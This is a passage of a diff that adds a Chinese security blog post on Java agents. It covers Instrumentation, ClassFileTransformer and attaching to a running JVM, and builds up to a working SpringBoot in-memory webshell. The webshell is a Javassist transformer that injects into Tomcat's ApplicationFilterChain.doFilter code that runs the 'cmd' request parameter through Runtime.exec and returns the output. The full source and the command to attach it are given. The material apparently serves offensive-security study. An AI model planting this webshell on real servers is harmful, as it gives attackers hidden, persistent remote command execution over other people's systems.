...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里第一个参数就是 java agent 参数，第二个参数就是 <code>Instrumentation</code>。</p>
+<p>注意注意，为了能让主 main 识别到 agent 入口类等原信息，需要补充 pom.xml 如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>java-agent-demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>agent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>demo.agent.StartupLogAgent<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>demo.agent.StartupLogAgent<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>自动编译会：META-INF&#x2F;MAINFEST.MF（指定 <code>Premain-Class</code>）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Created-By: Maven JAR Plugin 3.4.2</span><br><span class="line">Build-Jdk-Spec: 25</span><br><span class="line">Agent-Class: demo.agent.StartupLogAgent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: demo.agent.StartupLogAgent</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="浅谈-Instrumentation"><a href="#浅谈-Instrumentation" class="headerlink" title="浅谈 Instrumentation"></a>浅谈 <code>Instrumentation</code></h3><p><code>Instrumentation </code>是 <code>JVMTIAgent</code> （JVM Tool Interface Agent）的一部分。Java agent 通过这个类（准确来说是接口）和目标JVM进行交互，从而达到修改数据的效果。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">	<span class="comment">//添加 Transformer</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是 1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>你可以把 <code>Instrumentation</code> 的工作流程理解为：</p>
+<ol>
+<li><strong>查询：</strong> 通过 <code>getAllLoadedClasses</code> 找到目标。</li>
+<li><strong>评估：</strong> 用 <code>isModifiableClass</code> 确认目标能不能动。</li>
+<li><strong>准备 Transformer：</strong> 用 <code>addTransformer</code> 注册你的修改逻辑。</li>
+<li><strong>执行：</strong> 若是新加载的类，JVM 会<strong>自动拦截</strong>。<ul>
+<li>若是已经在运行的类，手动调用 <strong><code>retransformClasses</code></strong> 触发修改。</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StartupLogAgent</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EDIT_CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;demo.app.GreetingService&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EDIT_CLASS_NAME_VM</span> <span class="operator">=</span> EDIT_CLASS_NAME.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EDIT_METHOD_NAME</span> <span class="operator">=</span> <span class="string">&quot;greet&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[Agent] agentmain invoked&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StartupLogAgent</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StartupLogAgent</span>();</span><br><span class="line">        inst.addTransformer(transformer, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; loadedClass : inst.getAllLoadedClasses()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!EDIT_CLASS_NAME.equals(loadedClass.getName())) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!inst.isModifiableClass(loadedClass)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                inst.retransformClasses(loadedClass);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnmodifiableClassException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;	</span><br></pre></td></tr></table></figure>
+
+<h3 id="浅谈-ClassFileTransformer"><a href="#浅谈-ClassFileTransformer" class="headerlink" title="浅谈 ClassFileTransformer"></a>浅谈 <code>ClassFileTransformer</code></h3><p>可以发现 <code>addTransformer</code> 方法中，有一个参数是 <code>ClassFileTransformer</code>，它提供了一个 transform 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">default</span> <span class="type">byte</span>[]</span><br><span class="line">    transform(  ClassLoader         loader,</span><br><span class="line">                String              className,</span><br><span class="line">                Class&lt;?&gt;            classBeingRedefined,</span><br><span class="line">                ProtectionDomain    protectionDomain,</span><br><span class="line">                <span class="type">byte</span>[]              classfileBuffer) &#123;</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>使用  <code>Instrumentation.addTransformer()</code>  来加载一个转换器。</li>
+<li>转换器的返回结果（ <code>transform()</code> 方法的返回值）将成为转换后的字节码。</li>
+<li>对于没有加载的类，会使用  <code>ClassLoader.defineClass()</code>  定义它；对于已经加载的类，会使用 <code>ClassLoader.redefineClasses()</code> 重新定义，并配合 <code>Instrumentation.retransformClasses</code> 进行转换。</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] transform(</span><br><span class="line">        ClassLoader loader,</span><br><span class="line">        String className,</span><br><span class="line">        Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">        ProtectionDomain protectionDomain,</span><br><span class="line">        <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!EDIT_CLASS_NAME_VM.equals(className)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">            cp.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctc</span> <span class="operator">=</span> cp.get(EDIT_CLASS_NAME);</span><br><span class="line">        <span class="keyword">if</span> (ctc.isFrozen()) &#123;</span><br><span class="line">            ctc.defrost();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctc.getDeclaredMethod(EDIT_METHOD_NAME);</span><br><span class="line">        <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> <span class="string">&quot;&#123; return \&quot;Hello, \&quot; + $1 + \&quot;! This message is injected by agentmain.\&quot;; &#125;&quot;</span>;</span><br><span class="line">        method.setBody(source);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctc.toBytecode();</span><br><span class="line">        ctc.detach();</span><br><span class="line">        System.out.println(<span class="string">&quot;[Agent] transform success&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用 <code>AgentAttacher</code> ：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.attacher;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentAttacher</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Usage: java -jar attacher.jar &lt;pid&gt; &lt;agent-jar-path&gt; [agentArgs]&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">pid</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">agentJar</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">agentArgs</span> <span class="operator">=</span> args.length &gt; <span class="number">2</span> ? args[<span class="number">2</span>] : <span class="string">&quot;from-attach-demo&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[Attacher] attaching to pid &quot;</span> + pid);</span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(pid);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[Attacher] loading agent &quot;</span> + agentJar);</span><br><span class="line">            vm.loadAgent(agentJar, agentArgs);</span><br><span class="line">            System.out.println(<span class="string">&quot;[Attacher] agent loaded&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            vm.detach();</span><br><span class="line">            System.out.println(<span class="string">&quot;[Attacher] detached&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-Java-agent-写-SpringBoot-内存马"><a href="#利用-Java-agent-写-SpringBoot-内存马" class="headerlink" title="利用 Java agent 写 SpringBoot 内存马"></a>利用 Java agent 写 SpringBoot 内存马</h3><p>先写一个简单的 SpringBoot 项目来分	析 SpringBoot 内存马的构造方式：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260408210411838.png" alt="image-20260408210411838"></p>
+<p>直接跟到 <code>internalDoFilter</code> 来：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20260408210646741.png" alt="image-20260408210646741"></p>
+<p>很明显这里有参数 <code>RequestFacade </code> &amp; <code>ResponseFacade</code> ，就也不用复杂的用 <code>RequestFacade</code> 并通过反射拿 <code>Response</code> 了，直接设置就行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StartupLogAgent</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EDIT_CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EDIT_CLASS_NAME_VM</span> <span class="operator">=</span> EDIT_CLASS_NAME.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EDIT_METHOD_NAME</span> <span class="operator">=</span> <span class="string">&quot;doFilter&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[Agent] agentmain invoked&quot;</span>);</span><br><span class="line">        <span class="type">StartupLogAgent</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StartupLogAgent</span>();</span><br><span class="line">        inst.addTransformer(transformer, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; loadedClass : inst.getAllLoadedClasses()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (EDIT_CLASS_NAME.equals(loadedClass.getName())) &#123;</span><br><span class="line">                <span class="keyword">if</span> (inst.isModifiableClass(loadedClass)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        inst.retransformClasses(loadedClass);</span><br><span class="line">                        System.out.println(<span class="string">&quot;[Agent] Target class retransformed: &quot;</span> + EDIT_CLASS_NAME);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (UnmodifiableClassException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(</span><br><span class="line">            ClassLoader loader,</span><br><span class="line">            String className,</span><br><span class="line">            Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">            ProtectionDomain protectionDomain,</span><br><span class="line">            <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!EDIT_CLASS_NAME_VM.equals(className)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">                cp.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctc</span> <span class="operator">=</span> cp.get(EDIT_CLASS_NAME);</span><br><span class="line">            <span class="keyword">if</span> (ctc.isFrozen()) &#123;</span><br><span class="line">                ctc.defrost();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctc.getDeclaredMethod(EDIT_METHOD_NAME);</span><br><span class="line">            <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span></span><br><span class="line">                    <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;  String cmd = $1.getParameter(\&quot;cmd\&quot;);&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;  if (cmd != null &amp;&amp; !cmd.isEmpty()) &#123;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;    try &#123;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;      java.io.InputStream in = java.lang.Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;      java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;      String output = s.hasNext() ? s.next() : \&quot;\&quot;;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;      $2.getWriter().write(output);&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;      $2.getWriter().flush();&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;      return;&quot;</span> + </span><br><span class="line">                            <span class="string">&quot;    &#125; catch (Exception e) &#123;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;      e.printStackTrace();&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;    &#125;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;  &#125;&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            method.insertBefore(source);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctc.toBytecode();</span><br><span class="line">            ctc.detach();</span><br><span class="line">            System.out.println(<span class="string">&quot;[Agent] Transform Success: Command injection ready.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar attacher/target/attacher-1.0-SNAPSHOT.jar 14924 <span class="string">&quot;C:\Users\Lenovo\Documents\Playground\java-agent-demo\agent\target\agent-1.0-SNAPSHOT.jar&quot;</span> from-attach</span><br></pre></td></tr></table></figure>
+
